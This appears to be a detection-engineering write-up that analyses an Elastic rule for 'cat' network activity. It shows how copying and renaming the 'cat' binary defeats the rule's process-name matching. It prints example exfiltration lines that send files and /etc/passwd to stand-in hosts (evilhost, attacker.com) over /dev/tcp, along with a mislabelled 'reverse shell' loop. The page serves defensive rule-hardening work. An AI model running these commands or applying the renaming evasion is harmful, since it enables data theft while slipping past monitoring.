# ADE3-01 Example: Cat Network Activity Process Cloning

**Bug Category:** ADE3-01 Context Development - Process Cloning

## Original Rule

**Source:** [Elastic Security - Network Activity Detected via cat](https://www.elastic.co/docs/reference/security/prebuilt-rules/rules/linux/command_and_control_cat_network_activity)

**Description:** Searches for instances where the execution of the `cat` command is followed by a connection attempt by the same process. `cat` can be utilized to transfer data via TCP/UDP channels via redirection of its read output to `/dev/tcp` or `/dev/udp` channels.

Attackers may use this technique to transfer artifacts to another host in the network or exfiltrate data.

```SQL
sequence by host.id, process.entity_id with maxspan=3s
  [process where host.os.type == "linux" and event.type == "start" and event.action == "exec" and
   process.name == "cat" and process.parent.name in ("bash", "dash", "sh", "tcsh", "csh", "zsh", "ksh", "fish")]
  [network where host.os.type == "linux" and event.action in ("connection_attempted", "disconnect_received") and
   process.name == "cat" and not (
     destination.ip == null or destination.ip == "0.0.0.0" or cidrmatch(
       destination.ip, "10.0.0.0/8", "127.0.0.0/8", "169.254.0.0/16", "172.16.0.0/12", "192.0.0.0/24", "192.0.0.0/29",
       "192.0.0.8/32", "192.0.0.9/32", "192.0.0.10/32", "192.0.0.170/32", "192.0.0.171/32", "192.0.2.0/24",
       "192.31.196.0/24", "192.52.193.0/24", "192.168.0.0/16", "192.88.99.0/24", "224.0.0.0/4", "100.64.0.0/10",
       "192.175.48.0/24","198.18.0.0/15", "198.51.100.0/24", "203.0.113.0/24", "240.0.0.0/4", "::1", "FE80::/10",
       "FF00::/8"
     )
   )]
```

## Expected Detection

**Technique (atomic):**
```bash
cat file > /dev/tcp/evilhost/port
```

This causes bash to open a TCP connection to the remote host:port, streaming the file to the remote endpoint if the connection is successful.

## Detection Logic Analysis

The rule is a **sequence rule** with two states:

**State 1:** Process creation event
- `process.name == "cat"`
- Parent process is a shell (bash, dash, sh, etc.)

**State 2:** Network connection event
- `process.name == "cat"`
- Connection to external IP (excludes RFC1918, localhost, etc.)

**Grouped by:** `host.id`, `process.entity_id` (same process across both events)

**Time constraint:** `maxspan=3s` (both events must occur within 3 seconds)

## The Bug: ADE3-01 Context Development - Process Cloning

**Definition:** Detection logic relies on **string-based identification of a process or binary**, while implicitly assuming the attacker cannot clone or rename binaries.

**In this case:**
- Rule checks `process.name == "cat"` in both states
- `process.name` is mutable
- Attacker can duplicate and rename the `cat` binary

**Why It Works:**
- Cloned binary has identical functionality
- File hash remains the same
- Only the `process.name` field changes in logs
- Both sequence states rely on `process.name`, both fail to match

## Bypass - Process Cloning

### Rule Bypass 1: Process cloning to evade detection

**Bug subcategory:** ADE3-01 Context Development - Process Cloning

**Key insight:** An attacker with access to bash and `cat` does not need root to establish this activity (nor any special capability).

**Attack steps:**

1. Clone the `cat` binary:
   ```bash
   cp /bin/cat /usr/tmp/foo
   ```

2. Use cloned binary for data exfiltration:
   ```bash
   /usr/tmp/foo secretfile > /dev/tcp/evilhost/port
   ```

**Result:** **False Negative** - No alert generated

**Why it bypasses detection:**

**State 1 (Process creation):**
- Log shows: `process.name: "foo"` (not "cat")
- Rule condition: `process.name == "cat"` → **False**
- State 1 fails to match

**State 2 (Network connection):**
- Log shows: `process.name: "foo"` (not "cat")
- Rule condition: `process.name == "cat"` → **False**
- State 2 fails to match

**Sequence fails:** Both states require `process.name == "cat"`, neither matches.

### Contextual Development

The attacker **develops the context** by:

1. **Additional step (1):** Clone binary to set the context
2. **Intention:** Poison the `process.name` field in logs
3. **In-scope step (2):** Execute data exfiltration technique

**No special permissions required:**
- Non-root user can copy to user-writable directories (`/tmp`, `~/`, `/var/tmp`)
- Same functionality as original `cat` binary
- Same file hash (SHA256 identical)

## Impact

**False Negative:** Attacker can:
- Clone `cat` to any filename
- Exfiltrate data via TCP/UDP channels
- Bypass detection entirely

**Common exfiltration patterns:**
```bash
# Data exfiltration
cp /bin/cat /tmp/readfile
/tmp/readfile /etc/passwd > /dev/tcp/attacker.com/443

# Reverse shell over TCP
cp /bin/cat /home/user/.cache/netcat
while true; do /home/user/.cache/netcat < /dev/tcp/attacker.com/4444; done
```

## Why This Matters

**Bash special files (`/dev/tcp`, `/dev/udp`):**
- Built-in bash feature (not a real file)
- Allows network connections without `nc`, `socat`, or other tools
- Commonly used for file-less exfiltration
- Hard to detect without process-level monitoring

**Process name-only detection:**
- Trivially bypassed by renaming
- No elevated privileges required
- Works on all Linux distributions

## Related Techniques

**Similar process cloning bypasses:**
- `wget` / `curl` for downloads ([see wget example](process-cloning-wget.md))
- `aws` CLI for cloud API abuse ([see aws example](process-cloning-aws-cli.md))
- Any utility-based detection relying on `process.name`

---

**Related Documentation:**
- [ADE3 Context Development](../../docs/taxonomy/ade3-context-development.md)
- [ADE3-01 Wget Process Cloning](process-cloning-wget.md)
- [ADE3-01 AWS CLI Process Cloning](process-cloning-aws-cli.md)
